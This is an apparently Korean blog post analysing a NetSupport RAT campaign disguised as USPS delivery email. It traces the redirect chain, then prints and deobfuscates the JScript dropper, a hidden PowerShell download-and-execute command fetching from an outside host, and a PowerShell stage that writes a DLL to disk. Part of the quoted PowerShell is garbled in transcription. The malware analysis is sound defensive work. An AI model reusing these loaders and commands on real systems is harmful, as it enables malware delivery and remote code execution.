+++
title = "USPS 위장 NETSUPPORT RAT 악성코드.pdf"
date = "2025-01-29T16:39:52+09:00"
author = "sayoon"
tags = ["악성코드분석"]
keywords = ["메일 위장", "악성코드"]
description = "USPS 패키지 배송 관련 메일로 위장한 악성코드"
showFullContent = false
readingTime = false
hideComments = false
+++

> **3줄 요약**
>
> 1. 실행 시 `winlogdate.exe` 파일 드롭
> 2. 레지스트리 수정으로 로그인 마다 실행
> 3. 통신 및 원격 접속으로 개인정보 탈취

### 분석 파일

- 파일: [link](https://www.malware-traffic-analysis.net/2022/12/28/index.html)

**_발퀄 및 건너짚기가 남발하는 문서임니당_**

<br>

## 1. 배포 경로

![email](image.webp)

이 악성코드의 시작점은 이메일이다.  
아래 그림과 같이 운송업체 USPS를 위장한 메일을 보내 사용자가 외부 링크로 접속하도록 유도한다.

<br/>

## 2. 패킷 분석

사용자가 <kbd>Download Details</kbd>를 클릭하면 **lbbyqluzu.cracknight.ru**로 연결된다.  
이후 `302` 상태 코드를 받고 **patrickforeilly.com**으로 리다이렉트 된다

![packet](image-1.webp)

위 사진을 보면 **patrickforeilly.com**에서 `application/zip` 타입의 콘텐츠를 요청하고 있다.  
그 외에도, 아래와 같이 `javascript`파일을 다운 받는 것을 볼 수 있다

![alt text](image-2.webp)
![alt text](image-3.webp)

<br/>

## 3. 파일 분석

### 1) `4043_PCM.js` 파일

`4043_PCM.js` 파일은 난독화 된 `js`파일로, `eval` 명령어를 확인할 수 있었다.
이를 치환하면 아래와 같은 파일을 얻을 수 있었다.

```none
//UmExrsgJuDvLhVadkAWOTICPXF oMKilXfTnLOHCUhAFBP = "sheLl"; YZqOsTxnMmpABJCF = new
ActiveXObject(oMKilXfTnLOHCUhAFBP+"."+ //IxqOgMKi "ApPlIcAtIon"); FkLgcBCiVTGsmxdvpeb = new
ActiveXObject("SCRiPtIng.filesystemobJECt"); if (FkLgcBCiVTGsmxdvpeb.FolderExists("C:\\pROgRa"+ //IxqOgMKi
"mdAta\\mIcRosOft\\wINdoWs")) { //YhALZvBkfyGVcEPoHRNqIM YZqOsTxnMmpABJCF.ShellExecute("cmd", "/c"+ //IxqOgMKi "
Power"+oMKilXfTnLOHCUhAFBP+" -nop -w hidden "+ //IxqOgMKi "-ep bypaSS -enC SQ"+ //IxqOgMKi "BFAFgAIAAoA"+
//IxqOgMKi "E4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAb"+ //IxqOgMKi
"gB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHI"+ //IxqOgMKi "AaQBuAGcAKA"+ //IxqOgMKi "AiAGgAdAB0AHAA"+ //IxqOgMKi
"OgAvAC8"+ //IxqOgMKi "AMQBvAHQ"+ //IxqOgMKi "AYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZA"+ //IxqOgMKi
"BlAHgALgBwAGgAcAAiACkA", "", "open", 0); } //kdbyVceRuXIHitqmTjngWxOZAG
```

위 코드를 보기 쉽게 풀면,

```js
UmExrsgJuDvLhVadkAWOTICPXF oMKilXfTnLOHCUhAFBP = "shell";
YZqOsTxnMmpABJCF = new ActiveXObject(“shell” + ".Application");
FkLgcBCiVTGsmxdvpeb = new ActiveXObject("scripting.filesystemobject");
if (FkLgcBCiVTGsmxdvpeb.FolderExists("C:\\pROgRa" + "mdAta\\mIcRosOft\\wINdoWs")) {
	YZqOsTxnMmpABJCF.ShellExecute("cmd", "/c Power" + sheLl + " -nop -w hidden -epbypass -enC SQ...", "", "open", 0);
}
```

변수 `UmExrsgJuDvLhVadkAWOTICPXF oMKilXfTnLOHCUhAFBP`, `YZqOsTxnMmpABJCF`, `FkLgcBCiVTGsmxdvpeb`를 이용해 난독화된 변수명을 다시 바꿔주면,

```javascript
if (
  ActiveXObject("scripting.filesystemobject").FolderExists(
    "C:ProgramData\\MicrosoftWindows"
  )
) {
  ActiveXObject("scripting.filesystemobject").ShellExecute(
    "cmd",
    "/c Powershell -nop -w hidden -ep bypass -enC ...",
    "open",
    0
  );
}
```

이는 `C:\ProgramData\\Microsoft\Windows` 경로가 존재한다면, `Powershell `을 실행하는 명령어이다.

- `-w hidden` 옵션으로 `Powershell` 이 백그라운드에서 실행되도록 하고,
- `-enC` 옵션으로 `base64` 로 인코딩 된 명령어를 실행하므로

마지막 인자를 확인하면 어떤 `Powershell` 명령을 실행하는지 알 수 있다.

마지막 인자는 아래와 같고

```none
SQ"+ //IxqOgMKi "BFAFgAIAAoA"+ //IxqOgMKi "E4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAb"+
//IxqOgMKi "gB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHI"+ //IxqOgMKi "AaQBuAGcAKA"+ //IxqOgMKi "AiAGgAdAB0AHAA"+
//IxqOgMKi "OgAvAC8"+ //IxqOgMKi "AMQBvAHQ"+ //IxqOgMKi "AYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZA"+ //IxqOgMKi
"BlAHgALgBwAGgAcAAiACkA
```

필요 없는 문자열 `//Ixq0gMKi`를 지우고,
`base64`로 디코딩하면

```powershell
IEX(New-Object Net.Webclient).downloadstring("http://1otal.com/index/index.php")
```

라는 명령어가 나오는데, 이는 `http://1otal.com/index/index.php` 에서 스크립트를 다운 받아 실행하는 윈도우 powershell 명령어이다.

> `4043_PCM.js` 파일은 난독화된 `javascript` 파일을 `eval`을 이용하여 실행하는데,  
> 특정 url에서 `php`를 다운받아 `powershell`로 실행하는 악성 스크립트이다.

<br/>

### 2) **index.php**

![alt text](image-4.webp)

네트워크 패킷에서 추가적으로 `index.php`를 요청하는 것을 볼 수 있다.
해당 요청은 `text/html`로 아래와 같은 코드를 확인 할 수 있었는데

```powershell
function rEacT (${sOuRce}, ${deSTiNAtION})

{
&("{3}{O}{1}{2}{4}{5}"-f * '-', 'St', 'ring', 'Convert', 'oBinar', 'y', 'T') -InputString ${sOURce} -FilePath $
{destINATiON};

}

function coNVErt-STRINGTOBiNARy
¢

${iNDUTStRInG}, ${FilepATh}
)

${FiLe}= ${INPuTSTrInG}

${DATA} = ${328Nq}::("{3}{1}{2H0}" -f 'g', 'romBas' , 'e64Strin', 'F').Invoke(${FI1E})

${MS} = &("{1}{O}{2}"-f '-Objec','New','t') ("{4}{3H1HO}{2}" -f 're','St', 'am', 'I0.Memory' , 'System. ')

${mS}. ("{O}{1}" -f 'Wri', 'te').Invoke(${dATa}, 0, ${DATA}."LeNGtH")
${ms}.("{O}{1}" -f 'S','eek').Invoke(0,0) | &("{O}{1}" -f'Out-Nu', 'LL')

${cS} = &("{O}{2}{1}{3}"-F'Ne",'-",'w', Object') ("{OHSHEHIHSH3H2H7HI{4}"-f 'S',"pStrea','ion.GZ','s',
'm','ystem.10','.Com','i','res','p')(${ms},  (&("{2}{1}{0}" -f "ARIABLE','-v','get') ('1L'+'VbgH') -vAL )
::"dEcOMpREss")

${Sr} = &("{OH{2H{1}" -f 'New-Obj','ct','e') (“{4}{1}{6}{0}{3}{5}{2}"-f *.10.Stre','e','der','a', Syst', 'mRea',
*m')(${cS})
${t} = ${Sr}.("{0}{1}{2}"-f' read', 'toen','d').Invoke()

${bYTeARRAy} = (&("{1}{2}{0}" -f 'abLE','g',"Et-vaRI') ("3"+"28Nq") -VaLuEonly )::("{O}{3}{1}{2}"-f 'FromBase*
*ri','ng','64St").Invoke(${t});
( &("{O}{1}{2}"-F'GET-",i','Tem') (“vAriABL"+"E:uE"+"4yC")) . "VALUE": : ("{3}{1}{4}{2}{0}"-f Bytes', 'rit', 'ALL',
'w',"e').Invoke(${FIlepAth}, ${bYTEarRAy});

```

이는 window `powershell` 문법으로

- **rEacT**
- **coNVErt-STRINGTOBiNARy**

두 개의 함수를 확인할 수 있었다.  
그런데 `convert-stringtobinary`만 봐도 뭔가 수상하다!  
뭔가 문자열로 바이너리 파일을 만들 것 같다!

`powershell` 문법에서

- `"{3}{O}{1}{2}{4}{5}"`: 문자열이 포매팅 될 위치
- `{n}`: `-f` 뒤에 나열된 값들의 인덱스 참조
- `&`: 문자열을 명령으로 실행

하는 역할을 가지고 있다. 따라서 저 난독화된 문자열들은  
`powershell`의 함수와 변수들일 것으로 추정할 수 있다!

이를 바탕으로 변환하면

```php

function React (${source}, ${destination}) {
	ConvertStringToBinary -InputString ${source} -FilePath ${destination}
}

function ConvertStringToBinary (${inputString}, ${FilePath}) {
	$file = ${inputString}
	$data = System.Conver::FromBase64String.Invoke(${file})

	# 입력 데이터를 메모리 스트림으로 초기화
	$ms = New-Object System.IO.MemoryStream

	# 데이터를 메모리 스트림에 기록
	$ms.Write($data, 0, $data.Length)
	$ms.Seek(0, 0) | Out-Null

	# GZipStream 객체를 생성하여 압축 해제 준비
	$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)

	# StreamReader를 사용하여 압축 해제된 데이터를 읽음
	$sr = New-Object System.IO.StreamReader($cs)
	$t = $sr.ReadToEnd()

	# Base64 디코딩을, 바이트 배열로 변환
	$byteArray = [Convert]::FromBase64String($t)

	# 최종 데이터를 파일로 저장
	[System.IO.File]::WriteAllBytes($FilePath, $byteArray)
}

${destination} = "$fpath\HTCTL32.DLL"

React -source ${source} -destination ${destination}
```

> 이 코드는 `.zip` 파일로 된 파일을 읽어 압축 해제한 다음,  
> 해당 데이터를 `binary` 파일로 바꾸는 `powershell` 명령어이다

<br/>

## 여기까지 종합

1. *USPS 우편 회사*로 위장한 `email` 전송
2. 링크 클릭 -> 사전 준비해놓은 url로 유도하여 `javascript`, `zip`파일 다운
3. `javascript` -> `php` 파일 다운
4. `php` -> `.zip` 파일을 압축해제 하여 바이너리 파일 드랍

[너무길어져서 다음으로..](/posts/malware/usps2/
